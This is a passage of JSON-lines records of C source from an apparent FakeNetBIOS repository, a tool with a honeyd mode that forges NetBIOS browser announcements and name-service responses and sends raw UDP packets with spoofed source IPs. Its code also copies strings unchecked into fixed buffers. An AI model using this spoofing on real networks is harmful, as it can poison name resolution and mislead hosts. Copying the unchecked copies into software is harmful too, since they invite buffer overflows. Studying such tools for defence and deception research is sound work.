and\\n\");\n\tprintf(\"testing purposes by authorized individuals with permission to do so.\\n\");\n    printf(\"-----------\\n\\n\");\n\n\t/* Init params */\n\tdomainname = (unsigned char*)malloc(sizeof(unsigned char*)*15);\n\tstrcpy(domainname, \"WORKGROUP\");\n\thostnameradix = (unsigned char*)malloc(sizeof(unsigned char*)*15);\n\tstrcpy(hostnameradix, \"HOST\");\n\thostname = (unsigned char*)malloc(sizeof(unsigned char*)*15);\n\tdescription = (unsigned char*)malloc(sizeof(unsigned char*)*256);\n\tstrcpy(description, \"Windows XP Workstation\");\n\tcomment = (unsigned char*)malloc(sizeof(unsigned char*)*256);\n\n\t/* Get params */\n\twhile ((c = getopt (argc, argv, \"s:d:uD:N:f:a:n:c:t:T:vHh?\")) != -1)\n    {\n      switch (c)\n        {\n        case 's':\n          sourceIP = optarg;\n          break;\n        case 'd':\n          targetIP = optarg;\n          break;\n        case 'u':\n          raw_ip_on = 0;\n          break;\n        case 'D':\n          strcpy(domainname, optarg); // Cut at 15 char ? Try yourself...\n          break;\n        case 'N':\n          strcpy(hostnameradix, optarg); // Cut at 15 char ? Try yourself...\n          break;\n        case 'f':\n\t\t  confpath = (unsigned char*)malloc(sizeof(unsigned char)*strlen(optarg));\n\t\t  strcpy(confpath, optarg);\n          conffile_mode = 1;\n          break;\n        case 'a':\n          announce_type = atol(optarg);\n          break;\n        case 'n':\n          hostnum = atol (optarg);\n\t\t  numlong = strlen(optarg);\n          break;\n        case 'c':\n          strcpy(description, optarg);\n          break;\n        case 't':\n          meandelay = atol(optarg);\n          break;\n        case 'T':\n          timerset = 1;\n          timer = atol(optarg);\n          break;\n        case 'v':\n          verbose_on = 1;\n          break;\n        case 'H':\n          honeyd_mode = 1;\n          break;\n        case 'h':\n        case '?':\n        default:\n          showusage = 1;\n          break;\n        }\n    }\n\n\tif (showusage || targetIP == (unsigned char*)\"255.255.255.255\")\t// || argc<2\n\t\tusage(appname);\n\n\t/* Seed the random-number generator with current time */\n\tsrand((unsigned)(time(NULL)*getpid()));\n\n\t/* Get conf file */\n\tif (conffile_mode) {\n\t\tfp = fopen(confpath, \"rt\");\n\t\tif (fp == NULL) {\n\t\t\tfprintf(stderr, \"Config file '%s' not found.\\n\", confpath);\n\t\t\treturn 1;\n\t\t}\n\t\t/* Read the file line by line */\n\t\twhile(fgets(tmpbuf, 64, fp) != NULL) {\n\t\t\tsscanf(tmpbuf, \"%s%s%s%d%255c\", &domains[line_count], &hosts[line_count], &ipaddr[line_count], &ann_type[line_count], &desc[line_count]);\n\t\t\tfor (i=0; i<strlen(desc[line_count]); i++)\n\t\t\t\tdesc[line_count][i] = desc[line_count][i+1];\n\t\t\tdesc[line_count][strlen(desc[line_count])-1] = '\\0';\n\t\t\tline_count++;\n\t\t}\n\t\tfclose(fp);\n\t\tprintf(\"Host number in config file: %lu\\n\", line_count);\n\n\t\tif (verbose_on) {\n\t\t\tfor (i=0; i<line_count; i++)\n\t\t\t\tprintf(\"Dom: '%s'\\tHost: '%s'\\tIP: '%s'\\tAnn:'%d'\\tDesc: '%s'\\n\", domains[i], hosts[i], ipaddr[i], ann_type[i], desc[i]);\n\t\t}\n\t}\n\n#ifdef WIN32\n\t/* Winsock initialization */\n\tif (WSAStartup(MAKEWORD(2,2), &wsd) != 0) {\n\t\tprintf(\"Winsock did not initialize properly: Winsock error [%d]\\n\", GetLastError());\n\t\treturn -1;\n\t}\n#endif\n\n\t/* Host name mask */\n\tsprintf(namemask, \"%%s%%0%dd\", numlong);\n\n\t/* If in honeyd, wait for a random delay between 0 and 'meandelay' in ms\n\t   to avoid simultaneous announcements when starting */\n    if (honeyd_mode) {\n#ifdef WIN32\n\t\tinit_rnd = rand()*meandelay/RAND_MAX;\n#else\n\t\tint rnd_seed = init_rnd;\n\t\tinit_rnd = 1+(int)((meandelay/1000)*rand_r(&rnd_seed)/(RAND_MAX+1.0));\n#endif\n\t\tprintf(\"Honeyd mode: randomly sleeping to avoid simultaneous announcements: %lu\\n\", init_rnd);\n#ifdef WIN32\n\t\t\tSleep(init_rnd);\t// milliseconds\n#else\n\t\t\tsleep(init_rnd);\t// seconds\n#endif\n\n\t\t/* Compute the correct hostname tu use from the IP address */\n\t\tif ((!conffile_mode) && (sizeof(hostnameradix) < 11*sizeof(char))) {\n\t\t/* Get last number of IP address */\n\t\tchar* tmp = strrchr(sourceIP, '.');\n\t\ttmp+=sizeof(char);\n\t\tinit_rnd=atoi(tmp);\n\t\tstrcat(hostnameradix, tmp);\n\t\tprintf(\"Honeyd mode: hostname=radix+suffix(IP) = %s\\n\",hostnameradix);\n\t\t}\n\t}\n\n\t/* Main broadcast loop */\n\twhile (1)\n\t{\n\t\tif (conffile_mode)\n\t\t\thostnum = line_count;\n\n\t\t/* Host number loop */\n\t\tfor (hostcount=1; hostcount<hostnum+1; hostcount++)\n\t\t{\n\t\t\t/* Params computation */\n\t\t\tif (conffile_mode) {\n\t\t\t\t// Get {domain, host name, IP, desc and announce type}\n\t\t\t\tdomainname = domains[hostcount-1];\n\t\t\t\thostname = hosts[hostcount-1];\n\t\t\t\tsourceIP = ipaddr[hostcount-1];\n\t\t\t\tannounce_type = ann_type[hostcount-1];\n\t\t\t\tdescription = desc[hostcount-1];\n\t\t\t}\n\t\t\telse if ((hostnum > 1) && (!honeyd_mode))\n\t\t\t\tsprintf(hostname, namemask, hostnameradix, hostcount);\n\t\t\telse\n\t\t\t\tstrcpy(hostname, hostnameradix);\n\n\t\t\t/* Build headers and Browser packet */\n\t\t\tbuild_nbt_header(&nbt_hdr, sourceIP, hostname, domainname, announce_type);\n\t\t\tbuild_browser_announcement(&announcement, comment, hostname, domainname, description, announce_type);\n\t\t\tbuild_smb_header(&smb_hdr, strlen(comment));\n\n\t\t\t/* Build final buffer */\n\t\t\tmemcpy(sendbuf,&nbt_hdr,sizeof(nbt_hdr));\n\t\t\tbufLen = sizeof(nbt_hdr);\n\t\t\tmemcpy(sendbuf+bufLen,&smb_hdr,sizeof(smb_hdr));\n\t\t\tbufLen += sizeof(smb_hdr);\n\t\t\tmemcpy(sendbuf+bufLen,&announcement,sizeof(announcement));\n\t\t\tbufLen += sizeof(announcement);\n\t\t\tmemcpy(sendbuf+bufLen, comment, strlen(comment));\n\t\t\tbufLen += strlen(comment);\n\t\t\tmemcpy(sendbuf+bufLen, \"\\0\", 1);\n\t\t\tbufLen += 1;\n\n\t\t\t/* Send packet */\n\t\t\tprintf(\"Announcing '%s\\\\%s' (type %d) \", domainname, hostname, announce_type);\n\t\t\tif (raw_ip_on)\n\t\t\t\tsend_raw_ip_udp(resolve(sourceIP), 138, resolve(targetIP), 138, sendbuf, bufLen);\n\t\t\telse\n\t\t\t\tsend_udp(resolve(sourceIP), 138, resolve(targetIP), 138, sendbuf, bufLen);\n\n\t\t\t/* Verbose */\n\t\t\tif (verbose_on)\n\t\t\t{\n\t\t\t\tprintf(\"\\nBytes sent [%d]:\\n\", bufLen);\n\t\t\t\thexdump(sendbuf, bufLen);\n\t\t\t}\n\n\t\t\t/* Host announcement interval */\n\t\t\tif (hostnum > 1) {\n\t\t\t\trnddelay = rand() * meandelay / RAND_MAX;\n\t\t\t\tprintf(\"- Waiting for %3d ms...\\n\", rnddelay);\n#ifdef WIN32\n\t\t\t\tSleep(rnddelay);\n#else\n\t\t\t\tsleep(rnddelay/1000);\n#endif\n\t\t\t}\n\t\t} /* for */\n\n\t/* Broadcast interval */\n\tif (timerset)\n\t{\n\t\tprintf(\"\\nWaiting for %lu s before repeating same action...\\n\", timer);\n\t\tprintf(\"[CTRL+C to exit]\\n\\n\");\n#ifdef WIN32\n\t\tSleep(timer*1000);\t// Windows default: 720 s -> 12 min\n#else\n\t\tsleep(timer);\t\t// Windows default: 720 s -> 12 min\n#endif\n\t}\n\telse\n\t\tbreak;\n\t} /* Main broadcast loop */\n\n#ifdef WIN32\n\t/* Cleanup Winsock before leaving */\n\tWSACleanup();\n#endif\n\n\treturn 0;\n}", "path": "Sources\\FakeNetbiosDGM.c", "repo_name": "mubix/FakeNetBIOS", "stars": 41, "license": "other", "language": "c", "size": 178}
{"docstring": "/* Build the NBT DS NB response */\n", "func_signal": "void build_ns_nb_response(ns_nb_response *resp, unsigned short trans_id, unsigned char *IPaddr, char *name, char *spoofedIP)", "code": "{\n\tchar mangled_name[34];\n\n\t/* Params computation */\n\tname_mangle(name, mangled_name, 0x00); // TO DO: case 0x20\n\n\tmemset(resp, 0, sizeof(ns_nb_response));\n\n\t/* NBT DS NB response */\n\tresp->trans_id = htons(trans_id);\n\tresp->flags = htons(0x8500);\n\tresp->questions = 0;\n\tresp->answers = htons(1);\n\tresp->authority_RRs = 0;\n\tresp->additional_RRs = 0;\n\tstrcpy(resp->name, mangled_name);\n\tresp->ans_type = htons(0x20);\t// type: NB\n\tresp->ans_class = htons(1);\t\t// class: inet\n\t/*resp->ttl = htonl((unsigned long)(871663*rand()*30000/RAND_MAX));*/\t// real-life TTL (x days, y hours, ...)\n\tresp->ttl = htonl(30);\n\tresp->length = htons(6);\n\tresp->ans_flags = 0;\n\tresp->IPaddr = inet_addr(spoofedIP);\n}", "path": "Sources\\FakeNetbiosNS.c", "repo_name": "mubix/FakeNetBIOS", "stars": 41, "license": "other", "language": "c", "size": 178}
{"docstring": "/* Build a NBTSTAT name */\n", "func_signal": "void build_ns_nbtstat_name(ns_nbtstat_name *nbtstat_name, char *name, unsigned char number, unsigned char type)", "code": "{\n\tchar nb_name[16] = \"                \";\n\n\t/* Params computation */\n\tmemcpy(nb_name, name, strlen(name));\n\tnb_name[15] = number;\n\n\tmemset(nbtstat_name, 0, sizeof(ns_nbtstat_name));\n\n\t/* NBTSTAT name */\n\tmemcpy(nbtstat_name->name, nb_name, 16);\n\tnbtstat_name->flags = type;\n}", "path": "Sources\\FakeNetbiosNS.c", "repo_name": "mubix/FakeNetBIOS", "stars": 41, "license": "other", "language": "c", "size": 178}
{"docstring": "/* Build the SMB header */\n", "func_signal": "void build_smb_header (smb_header *hdr, int comment_size)", "code": "{\n\tmemset (hdr, 0, sizeof (smb_header));\n\n\t/* SMB Header */\n\tstrcpy (hdr->server_component, \"\\xffSMB\");\t// SMB magic header\n\thdr->command = 0x25;\n\thdr->error_class = 0;\n\thdr->reserved = 0;\n\thdr->error_code = 0;\n\thdr->flags = 0;\n\thdr->flags2 = 2;\n\thdr->proc_id_high = 0;\n\tstrcpy(hdr->signature, \"\\0\");\n\thdr->reserved2 = 0;\n\thdr->tree_id = 0;\n\thdr->proc_id = 0;\n\thdr->user_id = 0;\n\thdr->multiplex_id = 0;\n\n\t/* Transaction request */\n\thdr->word_count = 17;\n\thdr->total_param_count = 0;\n\thdr->total_data_count = 33 + comment_size;\n\thdr->max_param_count = 0;\n\thdr->max_data_count = 0;\n\thdr->max_setup_count = 0;\n\thdr->reserved3 = 0;\n\thdr->flags_summary = 0;\n\thdr->timeout = 1000;\t\t// 1000 ms\n\thdr->reserved4 = 0;\n\thdr->param_count = 0;\n\thdr->param_offset = 0;\n\thdr->data_count = 33 + comment_size;\n\thdr->data_offset = 86;\n\thdr->setup_count = 3;\n\thdr->mailslot_opcode = 1;\n\thdr->trans_priority = 0;\t// or 1\n\thdr->mailslot_class = 2;\n\thdr->size = 50 + comment_size;\n\tmemcpy(hdr->file_name, \"\\\\MAILSLOT\\\\BROWSE\\x00\", 17);\n}", "path": "Sources\\FakeNetbiosDGM.c", "repo_name": "mubix/FakeNetBIOS", "stars": 41, "license": "other", "language": "c", "size": 178}
{"docstring": "/* Mangle a name into NetBIOS format (NBT Level One encoding)\n Note:  <Out> must be (33 + strlen(scope) + 2) bytes long, at minimum.\n <name_type> is the NetBIOS service code. */\n", "func_signal": "int name_mangle (char *In, char *Out, char name_type)", "code": "{\n\tint i;\n\tint c;\n\tint len;\n\tchar buf[20];\n\tchar *p = Out;\n\n\t/* Safely copy the input string, In, into buf[]. */\n\t(void) memset (buf, 0, 20);\n\tif (strcmp (In, \"*\") == 0)\n\t\tbuf[0] = '*';\n\telse\n\t\t(void)sprintf(buf, \"%-15.15s%c\", In, name_type);\n\n\t/* Place the length of the first field into the output buffer. */\n\tp[0] = 32;\n\tp++;\n\n\t/* Now convert the name to the rfc1001/1002 format. */\n\tfor (i = 0; i < 16; i++)\n\t{\n\t  c = toupper (buf[i]);\n\t  p[i * 2] = ((c >> 4) & 0x000F) + 'A';\n\t  p[(i * 2) + 1] = (c & 0x000F) + 'A';\n\t}\n\tp += 32;\n\tp[0] = '\\0';\n\n\t/* Add the scope string. */\n\tfor (i = 0, len = 0; global_scope != NULL; i++, len++)\n\t{\n\t  switch (global_scope[i])\n\t\t{\n\t\tcase '\\0':\n\t\t  p[0] = len;\n\t\t  if (len > 0)\n\t\t\tp[len + 1] = 0;\n\t\t  return (name_len (Out));\n\t\tcase '.':\n\t\t  p[0] = len;\n\t\t  p += (len + 1);\n\t\t  len = -1;\n\t\t  break;\n\t\tdefault:\n\t\t  p[len + 1] = global_scope[i];\n\t\t  break;\n\t\t}\n\t}\n\n\treturn (name_len (Out));\n}", "path": "Sources\\FakeNetbiosNS.c", "repo_name": "mubix/FakeNetBIOS", "stars": 41, "license": "other", "language": "c", "size": 178}
{"docstring": "/* Host name resolve */\n", "func_signal": "unsigned long resolve(char *name)", "code": "{\n    struct hostent *he;\n    unsigned int ip;\n\n    if((ip=inet_addr(name))==(-1))\n    {\n        if((he=gethostbyname(name))==0)\n            return 0;\n        memcpy(&ip,he->h_addr,4);\n    }\n    return ip;\n}", "path": "Sources\\FakeNetbiosNS.c", "repo_name": "mubix/FakeNetBIOS", "stars": 41, "license": "other", "language": "c", "size": 178}
{"docstring": "/* Raw IP UDP connection */\n", "func_signal": "int send_raw_ip_udp(unsigned long sourceIP, unsigned short sourceport, unsigned long destIP, unsigned short destport, char *udpmsg, int udpmsgLen)", "code": "{\n\tint s;\t// socket\n#ifdef WIN32\n\tBOOL bOpt;\n#else\n\tint bOpt;\n#endif\n\tstruct sockaddr_in remote;\n\tIP_HDR ipHdr;\n\tUDP_HDR udpHdr;\n\tint ret;\n\tunsigned short iTotalSize,\n\t\tiUdpSize,\n\t\tiUdpChecksumSize,\n\t\tiIPVersion,\n\t\tiIPSize,\n\t\tcksum = 0;\n\tchar buf[MAX_PACKET],\n\t*ptr = NULL;\n\n\t/* Create a raw socket */\n\ts = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);\n#ifdef WIN32\n\tif (s == INVALID_SOCKET) {\n\t\tprintf(\"A raw socket couldn't be created: error [%d]\\nYour system must support raw sockets, or port already bound.\\n\", WSAGetLastError());\n\t\treturn -1;\n\t}\n#endif\n\n\t/* Enable the IP header include option */\n#ifdef WIN32\n\tbOpt = TRUE;\n#else\n\tbOpt = 1;\n#endif\n\tret = setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&bOpt, sizeof(bOpt));\n\n#ifdef WIN32\n\tif (ret == SOCKET_ERROR) {\n\t\tprintf(\"setsockopt(IP_HDRINCL) failed: error [%d]\\n\", WSAGetLastError());\n\t\treturn -1;\n\t}\n#endif\n\n\t/* Enable the Broadcast option */\n\tret = setsockopt(s, SOL_SOCKET, SO_BROADCAST, (char *)&bOpt, sizeof(bOpt));\n\n#ifdef WIN32\n\tif (ret == SOCKET_ERROR) {\n\t\tprintf(\"setsockopt(SO_BROADCAST) failed: error [%d]\\n\", WSAGetLastError());\n\t\treturn -1;\n\t}\n#endif\n\n\t/* Initalize the IP header */\n\tiTotalSize = sizeof(ipHdr) + sizeof(udpHdr) + udpmsgLen + 4;\n\n\tiIPVersion = 4;\n\tiIPSize = sizeof(ipHdr) / sizeof(unsigned long);\n\n\tiIPSize += 1;\n\n\tipHdr.ip_verlen = (iIPVersion << 4) | iIPSize;\n\tipHdr.ip_tos = 0;\t\t\t\t\t\t\t/* IP type of service */\n\tipHdr.ip_totallength = htons(iTotalSize);\t/* Total packet len */\n\tipHdr.ip_id = 0;\t\t\t\t\t\t\t/* IP id: set to 0 (will be replaced by the network provider)\n\t\t\t\t\t\t\t\t\t\t\t\t   or htons(0xDEAD) (reverse bytes) or rand() */\n\tipHdr.ip_offset = 0;\t\t\t\t\t\t/* Fragment offset field */\n\tipHdr.ip_ttl = 128;\t\t\t\t\t\t\t/* Time to live */\n\tipHdr.ip_protocol = 0x11;\t\t\t\t\t/* Protocol(UDP) */\n\tipHdr.ip_checksum = 0 ;\t\t\t\t\t\t/* IP checksum */\n\tipHdr.ip_srcaddr = sourceIP;\t\t\t\t/* Source address */\n\tipHdr.ip_destaddr = destIP;\t\t\t\t\t/* Destination address */\n\n\t/* Initalize the UDP header */\n\tiUdpSize = sizeof(udpHdr) + udpmsgLen;\n\n\tudpHdr.src_portno = htons(sourceport);\n\tudpHdr.dst_portno = htons(destport);\n\tudpHdr.udp_length = htons(iUdpSize);\n\tudpHdr.udp_checksum = 0 ;\n\n\tiUdpChecksumSize = 0;\n\tptr = buf;\n\tmemset(buf, 0, MAX_PACKET);\n\n\tmemcpy(ptr, &ipHdr.ip_srcaddr, sizeof(ipHdr.ip_srcaddr));\n\tptr += sizeof(ipHdr.ip_srcaddr);\n\tiUdpChecksumSize += sizeof(ipHdr.ip_srcaddr);\n\n\tmemcpy(ptr, &ipHdr.ip_destaddr, sizeof(ipHdr.ip_destaddr));\n\tptr += sizeof(ipHdr.ip_destaddr);\n\tiUdpChecksumSize += sizeof(ipHdr.ip_destaddr);\n\n\tptr++;\n\tiUdpChecksumSize += 1;\n\n\tmemcpy(ptr, &ipHdr.ip_protocol, sizeof(ipHdr.ip_protocol));\n\tptr += sizeof(ipHdr.ip_protocol);\n\tiUdpChecksumSize += sizeof(ipHdr.ip_protocol);\n\n\tmemcpy(ptr, &udpHdr.udp_length, sizeof(udpHdr.udp_length));\n\tptr += sizeof(udpHdr.udp_length);\n\tiUdpChecksumSize += sizeof(udpHdr.udp_length);\n\n\tmemcpy(ptr, &udpHdr, sizeof(udpHdr));\n\tptr += sizeof(udpHdr);\n\tiUdpChecksumSize += sizeof(udpHdr);\n\n\t// UDP payload\n\tmemcpy(ptr, udpmsg, udpmsgLen);\n\tiUdpChecksumSize += udpmsgLen;\n\n\tcksum = checksum((unsigned short *)buf, iUdpChecksumSize);\n\tudpHdr.udp_checksum = cksum;\n\n\t/* Final buffer */\n\tmemset(buf, 0, MAX_PACKET);\n\tptr = buf;\n\n\tmemcpy(ptr, &ipHdr, sizeof(ipHdr));\n\tptr += sizeof(ipHdr);\n\n\t/* IP option (length = 0x00 or correctly computed: 4 [second byte]) */\n\tmemcpy(ptr, \"\\x88\\x04\\x12\\x34\", 4);\n\tptr += 4;\n\n\tmemcpy(ptr, &udpHdr, sizeof(udpHdr));\n\tptr += sizeof(udpHdr);\n\n\tmemcpy(ptr, udpmsg, udpmsgLen);\n\n\tremote.sin_family = AF_INET;\n\tremote.sin_port = htons(destport);\n\tremote.sin_addr.s_addr = destIP;\n\n\t/* Send data */\n#ifdef WIN32\n\tret = sendto(s, buf, iTotalSize, 0, (SOCKADDR *)&remote, sizeof(remote));\n\tif (ret == SOCKET_ERROR) {\n\t\tprintf(\"sendto() failed: %d\\n\", WSAGetLastError());\n\t\treturn -2;\n\t} else\n#else\n\tret = sendto(s, buf, iTotalSize, 0, (struct sockaddr *)&remote, sizeof(remote));\n#endif\n\n\t/* Close socket */\n#ifdef WIN32\n\tclosesocket(s);\n#else\n\tclose(s);\n#endif\n\n\treturn 0;\n}", "path": "Sources\\FakeNetbiosDGM.c", "repo_name": "mubix/FakeNetBIOS", "stars": 41, "license": "other", "language": "c", "size": 178}
{"docstring": "/* Display a hex dump */\n", "func_signal": "void hexdump(unsigned char *p, unsigned int len)", "code": "{\n\tunsigned char *line = p;\n\tunsigned int thisline, offset = 0;\n\tunsigned int i;\n\n\twhile (offset < len)\n\t{\n\t\tprintf(\"%04x \", offset);\n\t\tthisline = len - offset;\n\t\tif (thisline > 16)\n\t\t\tthisline = 16;\n\n\t\tfor (i = 0; i < thisline; i++)\n\t\t\tprintf(\"%02x \", line[i]);\n\n\t\tfor (; i < 16; i++)\n\t\t\t\tprintf(\"   \");\n\n\t\tfor (i = 0; i < thisline; i++)\n\t\t\tprintf(\"%c\",\n\t\t\t       (line[i] >= 0x20\n\t\t\t\t&& line[i] < 0x7f) ? line[i] : '.');\n\n\t\tprintf(\"\\n\");\n\t\toffset += thisline;\n\t\tline += thisline;\n\t}\n}", "path": "Sources\\FakeNetbiosNS.c", "repo_name": "mubix/FakeNetBIOS", "stars": 41, "license": "other", "language": "c", "size": 178}
{"docstring": "/* Build the Browser protocol packet content */\n", "func_signal": "void build_browser_announcement (browser_announcement *announcement, char *comment, char *sourcename, char *destinationname, char *description, int type)", "code": "{\n\tmemset(announcement, 0, sizeof(browser_announcement));\n\n\t/* Browser announcement */\n\tswitch (type)\n\t\t{\n\t\tcase 4:\n\t\t\t/* Get Backup List Request */\n\t\t\tannouncement->command = 0x09;\n\t\t\tannouncement->update_count = 4;\t\t\t\t// Backup List Requested Count\n\t\t\tannouncement->announcement_interval = 113;\t// Backup Request Token\n\t\t\tstrcpy(comment, \"\");\n\t\t\tbreak;\n\n\t\tcase 3:\n\t\t\t/* Local Master Announcement */\n\t\t\tannouncement->command = 0x0f;\n\t\t\tannouncement->update_count = 0;\n\t\t\tannouncement->announcement_interval = 720000;\t// 720 000 sec = 12 min\n\t\t\tstrcpy(announcement->name, sourcename);\n\t\t\tannouncement->major_version = 5;\n\t\t\tannouncement->minor_version = 0;\n\t\t\tannouncement->server_type = 0x000c9b0b;\n\t\t\tannouncement->browser_protocol_major_version = 15;\n\t\t\tannouncement->browser_protocol_minor_version = 1;\n\t\t\tannouncement->browser_constant = 0xaa55;\n\t\t\tif (description != NULL)\n\t\t\t\tstrcpy(comment, description);\n\t\t\tbreak;\n\n\t\tcase 2:\n\t\t\t/* Domain/Workgroup announcement */\n\t\t\tannouncement->command = 0x0c;\n\t\t\tannouncement->update_count = 0;\n\t\t\tannouncement->announcement_interval = 300000;\t// 300 000 sec = 5 min\n\t\t\tstrcpy(announcement->name, destinationname);\n\t\t\tannouncement->major_version = 3;\n\t\t\tannouncement->minor_version = 10;\n\t\t\tannouncement->server_type = 0x80001000;\n\t\t\tannouncement->browser_protocol_major_version = (unsigned char) rand ();\n\t\t\tannouncement->browser_protocol_minor_version = (unsigned char) rand ();\n\t\t\tannouncement->browser_constant = htons((unsigned short) rand ());\n\t\t\tstrcpy(comment, sourcename);\n\t\t\tbreak;\n\n\t\tcase 1:\n\t\tdefault:\n\t\t\t/* Default case: Host announcement */\n\t\t\tannouncement->command = 0x01;\n\t\t\tannouncement->update_count = 0;\n\t\t\tannouncement->announcement_interval = 720000;\t// 720 000 sec = 12 min\n\t\t\tstrcpy(announcement->name, sourcename);\n\t\t\tannouncement->major_version = 5;\n\t\t\tannouncement->minor_version = 0;\n\t\t\tannouncement->server_type = 0x00001003;\n\t\t\tannouncement->browser_protocol_major_version = 15;\n\t\t\tannouncement->browser_protocol_minor_version = 1;\n\t\t\tannouncement->browser_constant = 0xaa55;\n\t\t\tif (description != NULL)\n\t\t\t\tstrcpy(comment, description);\n\t\t\tbreak;\n\t\t}\n\n\t\t/*\tPossible BROWSE commands:\n\t\t\t0x01: Host Announcement\n\t\t\t0x02: Request Announcement\n\t\t\t0x08: Browser Election Request\n\t\t\t0x09: Get Backup List Request\n\t\t\t0x0a: Get Backup List Response\n\t\t\t0x0b: Become Backup Browser\n\t\t\t0x0c: Domain/Workgroup Announcement\n\t\t\t0x0d: Master Announcement\n\t\t\t0x0e: Reset Browser State Announcement\n\t\t\t0x0f: Local master Announcement\n\n\t\t\tSome NETLOGON commands:\n\t\t\t0x07: Query for PDC\n\t\t\t0x12: SAM Logon Request from Client\n\t\t\tetc.\n\t\t*/\n\n\t\t/*\tSome classical server types (bits):\n\t\t\t0x00001003: Workstation, Server\n\t\t\t0x000c9b0b: Workstation, Server, DC and Master Browser\n\t\t\t0x0006120b: Workstation, Server, DC, Print Queue Server, Master Browser and Backup Browser\n\t\t\t0x80001000: Domain/Workgroup, Domain Enum\n\t\t\tetc.\n\t\t*/\n}", "path": "Sources\\FakeNetbiosDGM.c", "repo_name": "mubix/FakeNetBIOS", "stars": 41, "license": "other", "language": "c", "size": 178}
{"docstring": "/* Build the NS NB Release packet */\n", "func_signal": "void build_ns_nb_release(ns_nb_release *release, unsigned char *IPaddr, char *name, char nbsvc)", "code": "{\n\tchar mangled_name[34];\n\n\t/* Params computation */\n\tname_mangle(name, mangled_name, nbsvc);\n\n\tmemset(release, 0, sizeof(ns_nb_release));\n\n\t/* NS NB release */\n\trelease->trans_id = htons((unsigned short)rand());\n\trelease->flags = htons(0x3010);\n\trelease->questions = htons(1);\n\trelease->answers = 0;\n\trelease->authority_RRs = 0;\n\trelease->additional_RRs = htons(1);\n\tstrcpy(release->query_name, mangled_name);\n\trelease->query_type = htons(0x20);\t\t// type: NB\n\trelease->query_class = htons(1);\t\t// class: inet\n\trelease->additional_name = htons(0xc00c);\n\trelease->additional_type = htons(0x20);\n\trelease->additional_class = htons(1);\n\trelease->ttl = 0;\n\trelease->length = htons(6);\n\trelease->query_flags = 0;\n\trelease->IPaddr = inet_addr(IPaddr);\n\n\t/* Complete release =\n\t\tName, 0x00\n\t\tName, 0x03\n\t\tName, 0x20\n\t\tDomain, 0x00\n\t\tDomain, 0x1e\n\t\tetc.\n\t*/\n}", "path": "Sources\\FakeNetbiosNS.c", "repo_name": "mubix/FakeNetBIOS", "stars": 41, "license": "other", "language": "c", "size": 178}
{"docstring": "/* Build a NBTSTAT response packet end */\n", "func_signal": "void build_ns_nbtstat_response_end(ns_nbtstat_response_end *nbtstat_response_end)", "code": "{\n\tmemset(nbtstat_response_end, 0, sizeof(ns_nbtstat_response_end));\n\n\t/* NBTSTAT end */\n\tmemcpy(nbtstat_response_end->unit_id, \"\\x00\\x01\\x03\\x31\\x37\\xAA\", 8);\n\tnbtstat_response_end->jumpers = 0;\n\tnbtstat_response_end->test_result = 0;\n\tnbtstat_response_end->version = 0;\n\tnbtstat_response_end->stats = 0;\n\tnbtstat_response_end->crc_num = 0;\n\tnbtstat_response_end->errors = 0;\n\tnbtstat_response_end->collisions = 0;\n\tnbtstat_response_end->send_aborts = 0;\n\tnbtstat_response_end->good_sends = 0;\n\tnbtstat_response_end->good_rcvs = 0;\n\tnbtstat_response_end->retrans = 0;\n\tnbtstat_response_end->no_rsc_conditions = 0;\n\tnbtstat_response_end->cmd_blocks = 0;\n\tnbtstat_response_end->pending_sessions = 0;\n\tnbtstat_response_end->max_pending_sessions = 0;\n\tnbtstat_response_end->max_sessions = 0;\n\tnbtstat_response_end->packet_size = 0;\n\tmemset(nbtstat_response_end->end, 0, 22);\n}", "path": "Sources\\FakeNetbiosNS.c", "repo_name": "mubix/FakeNetBIOS", "stars": 41, "license": "other", "language": "c", "size": 178}
{"docstring": "/* Return the total storage length of a mangled name */\n", "func_signal": "int name_len (char *s1)", "code": "{\n\t/* NOTE: this argument _must_ be unsigned */\n\tunsigned char *s = (unsigned char *) s1;\n\tint len;\n\n\t/* If the two high bits of the byte are set, return 2. */\n\tif (0xC0 == (*s & 0xC0))\n\treturn (2);\n\n\t/* Add up the length bytes. */\n\tfor (len = 1; (*s); s += (*s) + 1)\n\t{\n\t  len += *s + 1;\n\t  assert (len < 80);\n\t}\n\n\treturn (len);\n}", "path": "Sources\\FakeNetbiosDGM.c", "repo_name": "mubix/FakeNetBIOS", "stars": 41, "license": "other", "language": "c", "size": 178}
{"docstring": "/* Mangle a name into NetBIOS format (NBT level one encoding)\n Note:  <Out> must be (33 + strlen(scope) + 2) bytes long, at minimum.\n <name_type> is the NetBIOS service code. */\n", "func_signal": "int name_mangle (char *In, char *Out, char name_type)", "code": "{\n\tint i;\n\tint c;\n\tint len;\n\tchar buf[20];\n\tchar *p = Out;\n\n\t/* Safely copy the input string, In, into buf[]. */\n\t(void) memset (buf, 0, 20);\n\tif (strcmp (In, \"*\") == 0)\n\tbuf[0] = '*';\n\telse\n\t(void)sprintf(buf, \"%-15.15s%c\", In, name_type);\n\n\t/* Place the length of the first field into the output buffer. */\n\tp[0] = 32;\n\tp++;\n\n\t/* Now convert the name to the rfc1001/1002 format. */\n\tfor (i = 0; i < 16; i++)\n\t{\n\t  c = toupper (buf[i]);\n\t  p[i * 2] = ((c >> 4) & 0x000F) + 'A';\n\t  p[(i * 2) + 1] = (c & 0x000F) + 'A';\n\t}\n\tp += 32;\n\tp[0] = '\\0';\n\n\t/* Add the scope string. */\n\tfor (i = 0, len = 0; global_scope != NULL; i++, len++)\n\t{\n\t  switch (global_scope[i])\n\t\t{\n\t\tcase '\\0':\n\t\t  p[0] = len;\n\t\t  if (len > 0)\n\t\t\tp[len + 1] = 0;\n\t\t  return (name_len (Out));\n\t\tcase '.':\n\t\t  p[0] = len;\n\t\t  p += (len + 1);\n\t\t  len = -1;\n\t\t  break;\n\t\tdefault:\n\t\t  p[len + 1] = global_scope[i];\n\t\t  break;\n\t\t}\n\t}\n\n\treturn (name_len (Out));\n}", "path": "Sources\\FakeNetbiosDGM.c", "repo_name": "mubix/FakeNetBIOS", "stars": 41, "license": "other", "language": "c", "size": 178}
